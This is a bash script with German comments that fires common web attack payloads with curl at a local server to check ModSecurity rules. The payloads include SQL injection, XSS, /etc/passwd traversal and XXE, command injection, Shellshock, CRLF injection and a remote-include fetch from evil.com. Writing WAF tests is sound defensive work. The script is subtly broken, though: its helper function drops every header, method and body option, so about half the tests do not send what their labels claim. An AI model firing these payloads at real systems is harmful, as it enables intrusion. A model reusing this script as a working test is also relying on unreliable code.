#!/usr/bin/env bash
# Dieses Script testet verschiedene ModSecurity-Rules durch typische Angriffs-Payloads.
# URL anpassen, falls nötig (Port, Pfad, VirtualHost, ...).

url="http://localhost:81"
#url="https://coding-freaks.com"

# Hilfsfunktion für Requests
send() {
  echo -e "\n▶️  $1"
  # -s für silent, -i um Header+Body zu sehen, -X für Methode, --fail um Exit-Code >0 bei HTTP>=400
  curl -s -i "$2" || echo "✖️ Request failed"
}

# 1) SQL Injection
send "SQLi: OR 1=1" "$url/?id=1' OR '1'='1"
send "SQLi: UNION SELECT" "$url/?id=1 UNION SELECT username,password FROM users--"

# 2) XSS
send "XSS: simple" "$url/?q=<script>alert(1)</script>"
send "XSS: event handler" "$url/?q=<img src=x onerror=alert(2)>"

# 3) Directory Traversal / LFI
send "LFI: etc/passwd" "$url/?page=../../../../etc/passwd"
send "Null-Byte LFI" "$url/?page=../../../../etc/passwd%00.html"

# 4) Remote File Inclusion (RFI)
send "RFI: remote URL" "$url/?page=http://evil.com/shell.txt"

# 5) Command Injection
send "CMDi: backticks" "$url/?cmd=\`id\`"
send "CMDi: semicolon" "$url/?cmd=ls /; cat /etc/passwd"

# 6) Shellshock
send "Shellshock" "$url/" "-H 'User-Agent: () { :;}; echo \"modsec-shellshock\"'"

# 7) Web-Protocol Abuse
send "Protocol Data URIs" "$url/?img=data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+"

# 8) Suspicious Headers
send "Header: X-Forwarded-For SQLi" "$url/" "-H 'X-Forwarded-For: 1' OR '1'='1'"
send "Header: Referer XSS" "$url/" "-H 'Referer: <script>alert(3)</script>'"

# 9) Large Header (DOS/Malform)
big=$(printf 'A%.0s' {1..5000})
send "Large Header" "$url/" "-H \"X-Long-Header: $big\""

# 10) HTTP Method Anomalies
send "PUT Method" "$url/" "-X PUT -d 'test=1'"
send "DELETE Method" "$url/" "-X DELETE"

# 11) CSRF Token Missing / Invalid
send "CSRF Missing" "$url/login" "-X POST -d 'user=foo&pass=bar'"

# 12) XML External Entity (XXE)
xml="<?xml version=\"1.0\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><foo>&xxe;</foo>"
send "XXE" "$url/xml" "-H 'Content-Type: application/xml' --data '$xml'"

# 13) Path Normalization Edge Cases
send "Dot-Slash Bounce" "$url/./././admin"
send "Encoded Slash" "$url/%2e%2e/%2e%2e/etc/passwd"

# 14) CRLF Injection
send "CRLF in URL" "$url/?q=foo%0d%0aSet-Cookie:%20hacked=1"
    
echo ""done 